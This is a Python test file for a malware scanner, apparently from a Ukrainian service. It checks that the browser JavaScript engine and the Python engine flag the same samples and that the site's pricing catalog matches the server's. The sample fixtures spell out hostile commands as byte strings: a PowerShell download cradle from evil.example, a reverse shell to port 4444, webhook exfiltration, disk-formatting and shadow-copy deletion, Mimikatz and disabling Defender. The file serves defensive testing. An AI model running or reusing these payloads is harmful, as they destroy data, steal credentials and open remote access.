"""Паритет браузерного движка и Python-движка.

Статический сайт на GitHub Pages не может запускать Python, поэтому правила
продублированы в JavaScript. Этот тест — единственная гарантия, что обе
реализации видят одни и те же образцы одинаково. Если он падает, значит
сайт и серверная версия разошлись.
"""

from __future__ import annotations

import base64
import io
import json
import shutil
import subprocess
import zipfile
from pathlib import Path

import pytest

from xsafety.scan.engine import ScanError, scan_bytes
from tests.pe_builder import build_pe

ROOT = Path(__file__).resolve().parent.parent
RUNNER = ROOT / "tests" / "web" / "scan_cases.mjs"
NODE = shutil.which("node")


def _zip(entries: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, data in entries.items():
            archive.writestr(name, data)
    return buffer.getvalue()


def samples() -> list[tuple[str, bytes, str]]:
    nested = _zip(
        {
            "payload.ps1": b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')\n",
            "../../etc/passwd": b"x",
            "invoice.pdf.exe": b"MZ" + b"\x00" * 64,
        }
    )
    jar = _zip(
        {
            "META-INF/MANIFEST.MF": b"Manifest-Version: 1.0\nMain-Class: com.evil.Main\n",
            "com/evil/Main.class": b"\xca\xfe\xba\xbejava/lang/Runtime getRuntime exec\x00",
            "payload.exe": b"MZ" + b"\x00" * 32,
        }
    )
    return [
        (
            "danger.bat",
            b"@echo off\nformat C: /q\ndel /f /s /q C:\\Windows\\System32\n"
            b"vssadmin delete shadows /all /quiet\n"
            b"powershell.exe -WindowStyle Hidden -enc " + b"A" * 80 + b"\n",
            "m1",
        ),
        ("dropper.py", b"import os, base64, requests\nos.system('whoami')\n"
         b"exec(base64.b64decode('cHJpbnQoMSk='))\n"
         b"requests.post('https://discord.com/api/webhooks/1/abc', json={})\n"
         b"s = socket.socket(socket.AF_INET)\ns.connect(('1.2.3.4', 4444))\nos.dup2(s.fileno(), 0)\n", "m1"),
        ("x.js", b"eval(atob('YWxlcnQoMSk=')); new ActiveXObject('WScript.Shell').Run('cmd.exe');", "m2"),
        ("payload.ps1", b"IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')\n"
         b"Invoke-Mimikatz -DumpCreds\nSet-MpPreference -DisableRealtimeMonitoring $true\n", "m2"),
        ("run.vbs", b'Set h = CreateObject("MSXML2.XMLHTTP")\n'
         b'Set s = CreateObject("ADODB.Stream")\ns.SaveToFile "x.exe", 2\n'
         b'CreateObject("WScript.Shell").Run "x.exe"\n', "m3_lite"),
        ("invoice.hta", b'<html><script src="https://evil.example/p.js"></script>'
         b'<script>new ActiveXObject("WScript.Shell").Run("cmd.exe")</script></html>', "m3_lite"),
        ("archive.zip", nested, "m3_lite"),
        ("app.jar", jar, "m3_pro"),
        (
            "evil.dll",
            build_pe(dll=True, rwx=True, import_functions=("VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread")),
            "m3_lite",
        ),
        ("evil.exe", build_pe(dll=False, import_functions=("CreateRemoteThread", "GetProcAddress")), "m3_pro"),
        ("fake.dll", b"not a real dll at all", "m3_lite"),
        ("hello.bat", b"@echo off\r\necho hello\r\npause\r\n", "m1"),
        (
            "keys.py",
            b"-----BEGIN RSA PRIVATE KEY-----\nAKIAABCDEFGHIJKLMNOP\nghp_" + b"a" * 36,
            "m1",
        ),
    ]


def _python_result(name: str, data: bytes, model: str) -> dict:
    try:
        result = scan_bytes(name, data, model)
    except ScanError as error:
        return {"ok": False, "code": error.code}
    return {
        "ok": True,
        "verdict": result.verdict,
        "sig_ids": sorted({finding.sig_id for finding in result.findings}),
        "extension": result.extension,
        "size": result.size,
        "sha256": result.sha256,
    }


@pytest.mark.skipif(NODE is None, reason="Node.js недоступен")
def test_js_engine_matches_python(tmp_path):
    cases = samples()
    payload = [
        {"name": name, "model": model, "data": base64.b64encode(data).decode("ascii")}
        for name, data, model in cases
    ]
    cases_path = tmp_path / "cases.json"
    out_path = tmp_path / "out.json"
    cases_path.write_text(json.dumps(payload), encoding="utf-8")

    completed = subprocess.run(
        [NODE, str(RUNNER), str(cases_path), str(out_path)],
        capture_output=True,
        text=True,
        cwd=ROOT,
        timeout=180,
    )
    if completed.returncode != 0:
        pytest.fail(f"Node-движок упал:\n{completed.stdout}\n{completed.stderr}")

    js_results = {item["name"]: item for item in json.loads(out_path.read_text(encoding="utf-8"))}

    for name, data, model in cases:
        expected = _python_result(name, data, model)
        actual = js_results[name]
        assert actual["ok"] == expected["ok"], (name, actual, expected)
        if not expected["ok"]:
            assert actual["code"] == expected["code"], name
            continue
        assert actual["verdict"] == expected["verdict"], (name, actual["verdict"], expected["verdict"], actual["notes"])
        missing = set(expected["sig_ids"]) - set(actual["sig_ids"])
        extra = set(actual["sig_ids"]) - set(expected["sig_ids"])
        assert not missing, f"{name}: JS не нашёл {sorted(missing)}"
        assert not extra, f"{name}: JS нашёл лишнее {sorted(extra)}"
        assert actual["sha256"] == expected["sha256"], name


@pytest.mark.skipif(NODE is None, reason="Node.js недоступен")
def test_catalog_matches_python():
    """Тарифы, лимиты и цены на сайте совпадают с серверными."""
    from xsafety.config import MODELS, PLAN_ORDER, PLANS, PRICING
    from xsafety.pricing import discount_percent

    source = (ROOT / "js" / "data" / "catalog.js").read_text(encoding="utf-8")
    token = source.split('D("', 1)[1].rsplit('")', 1)[0]
    from xsafety.scan.ldr import encode_text

    # Обратное кодирование не нужно: декодируем тем же ключом.
    from xsafety.scan.ldr import L

    catalog = json.loads(L(token))
    plans = {plan["id"]: plan for plan in catalog["plans"]}
    assert set(plans) == set(PLAN_ORDER)
    for plan_id in PLAN_ORDER:
        plan = PLANS[plan_id]
        expected_limits = {mid: {"requests": a.requests, "mb": a.mb} for mid, a in plan.allowances.items()}
        assert plans[plan_id]["limits"] == expected_limits, plan_id
        offers = plans[plan_id]["offers"]
        assert len(offers) == len(PRICING.get(plan_id, ()))
        for actual, offer in zip(offers, PRICING.get(plan_id, ())):
            assert actual["price"] == offer.price
            assert actual["old_price"] == offer.old_price
            assert round(actual["discount"], 1) == round(float(discount_percent(offer.old_price, offer.price)), 1)
    models = {model["id"]: model for model in catalog["models"]}
    for model in MODELS:
        assert models[model.id]["extensions"] == list(model.extensions)
    assert catalog["currency"] == "грн"
    assert catalog["refill_hours"] == 24
    assert encode_text("ok")  # ключ LDR импортируется без побочных эффектов
